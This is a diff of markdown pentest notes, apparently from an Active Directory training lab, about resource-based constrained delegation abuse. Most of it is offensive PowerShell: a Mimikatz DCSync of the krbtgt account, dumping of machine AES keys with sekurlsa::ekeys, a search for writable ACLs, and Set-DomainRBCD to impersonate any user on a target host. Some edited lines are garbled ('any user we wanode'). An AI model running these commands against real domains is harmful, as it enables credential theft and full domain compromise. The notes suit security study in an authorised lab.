@@ -418,29 +418,24 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 
 We need two privileges
 
-1. Control over an object which has SPN configured or set SPN (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
-2. Write permissions over the target service or object (ACL) to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
+1. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain ms DS MachineAccountQuota is 10 for all domain users)
+2. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity .
 
 ### Tool
 
-**Find Write ACL on machines (do that with every user you own) - write on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute**
+Find Write ACL on machines (do that with every user you own)
 
 ```powershell
 Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
-Get-DomainRBCD
+
 
 cd ADModule-master
 Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
 Import-Module .\ActiveDirectory\ActiveDirectory.psd1
-```
 
-**Set RBCD on dcorp-mgmt for the student VMs**:
 
-{% code overflow="wrap" %}
-```powershell
-Set-DomainRBCD -Identity hostname-target-from-find-interesting-acl -DelegateFrom 'your-machine-account$' -Verbose
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'your-username' -Verbose
 ```
-{% endcode %}
 
 **Get your own Machine Account AES-Hash**
 
@@ -448,7 +443,7 @@ Set-DomainRBCD -Identity hostname-target-from-find-interesting-acl -DelegateFrom
 Invoke-mimikatz -command '"sekurlsa::ekeys"'
 ```
 
-**Access the machine with our AES key with ANY user we want**
+Access the machine with our AES key with ANY user we wanode
 
 {% code overflow="wrap" %}
 ```powershell
